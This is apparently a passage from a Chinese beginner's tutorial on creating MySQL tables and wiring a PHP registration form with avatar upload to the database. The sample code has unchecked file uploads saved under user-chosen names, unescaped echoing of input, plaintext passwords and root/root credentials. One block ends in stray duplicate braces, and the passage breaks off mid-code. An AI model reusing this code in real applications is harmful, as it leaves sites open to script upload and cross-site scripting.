<th>user</th>
<th>pass</th>
<th>phone</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>admin</td>
<td>123456</td>
<td>13800000000</td>
</tr>
<tr>
<td>自增数字</td>
<td>字符串</td>
<td>字符串</td>
<td>数字</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use kkk; //进入库</span><br><span class="line">//创建kkk_tbl表</span><br><span class="line">CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span><br><span class="line">`id` INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">`user` VARCHAR(10) NOT NULL,</span><br><span class="line">`pass` VARCHAR(10) NOT NULL,</span><br><span class="line">`phone` INT(11) NOT NULL,</span><br><span class="line">PRIMARY KEY ( `id` )</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。</p>
</li>
<li>
<p>DEFAULT value - 设置默认值</p>
</li>
<li>
<p>UNSIGNED - 使用无符号数值类型，0 及正数</p>
</li>
<li>
<p>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1</p>
</li>
<li>
<p>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的PRIMARY KEY 设置为 ID 数值，与 AUTO_INCREMENT 一起使用。</p>
</li>
</ul>
<h4 id="查看表的框架"><a class="header-anchor" href="#查看表的框架">¶</a>查看表的框架</h4>
<p><code>desc kkk_tbl;</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key |</span></span><br><span class="line"><span class="keyword">Default</span> <span class="operator">|</span> Extra <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+-----+---------+----------------+ | id | int(10)</span></span><br><span class="line">unsigned <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> PRI <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> auto_increment <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span> <span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> pass <span class="operator">|</span></span><br><span class="line"><span class="type">varchar</span>(<span class="number">10</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">|</span> phone <span class="operator">|</span> <span class="type">int</span>(<span class="number">11</span>) <span class="operator">|</span> <span class="keyword">NO</span> <span class="operator">|</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="operator">|</span> <span class="operator">+</span><span class="comment">-------+------------------+------+--</span></span><br><span class="line"><span class="comment">---+---------+----------------+</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>增加数据</p>
<ul>
<li><code>insert into kkk_tbl(user,pass,phone) values('admin','123456','1380000000');</code></li>
</ul>
</li>
<li>
<p>删除数据</p>
<ul>
<li><code>delete from kkk_tbl where user=&quot;admin&quot;;</code></li>
</ul>
</li>
</ul>
<h2 id="PHP联动MySQL"><a class="header-anchor" href="#PHP联动MySQL">¶</a>PHP联动MySQL</h2>
<ul>
<li>PHP创建数据库</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 面向过程</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;  <span class="comment">// 数据库名为myDB</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>连接数据</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>其他需要调用该文件的php</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;create DATABASE myDaB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>面向对象的</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建数据库</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDB&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Error creating database: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>使用PDO</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="variable">$conn</span> = <span class="keyword">new</span> 		<span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=<span class="subst">$servername</span>&quot;</span>,<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">	<span class="comment">// 设置 PDO 错误模式为异常</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, 	PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;CREATE DATABASE myDBPDO&quot;</span>;</span><br><span class="line"><span class="comment">// 使用 exec() ，因为没有结果返回</span></span><br><span class="line">	<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="literal">null</span>;  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>创建表（面对过程）</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需要设置进去的库</span></span><br><span class="line">conn.php 文件 新增</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;myDB&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>生成表内基本框架</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">`id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">`user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">`phone` INT(11) NOT NULL,</span></span><br><span class="line"><span class="string">PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">)ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;创建数据表错误: &quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);  <span class="comment">// 关闭连接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="注册界面任务分解"><a class="header-anchor" href="#注册界面任务分解">¶</a>注册界面任务分解</h2>
<h4 id="网站注册界面-网站首页"><a class="header-anchor" href="#网站注册界面-网站首页">¶</a>网站注册界面/网站首页</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian; 输出验证</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">	<span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line"><span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line"><span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line"><span class="comment">//密码验证</span></span><br><span class="line"><span class="comment">//手机11位</span></span><br><span class="line"><span class="comment">//文件上传jpg</span></span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$ERR</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">	<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h4>
<p>​	1、先判断是否有库，如果没有库就创建</p>
<p>​	2、判断是否有表，没有表直接创建</p>
<p>​	3、注册成功后直接将数据插入到表的内容里面</p>
<h4 id="最后代码"><a class="header-anchor" href="#最后代码">¶</a>最后代码</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// conn.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">    `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">    `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">    `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">	PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">	<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 最后整合.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$password1</span>) &amp;&amp;</span><br><span class="line">		<span class="keyword">empty</span>(<span class="variable">$password2</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;用户名、密码、手机号码不能为空&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;密码长度必须大于等于8位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;两次密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="number">11</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;手机号码不符合规范&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//开始处理图片</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tupian</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">		<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件存储在:tupian/&quot;</span>.<span class="variable">$tupianfile</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span 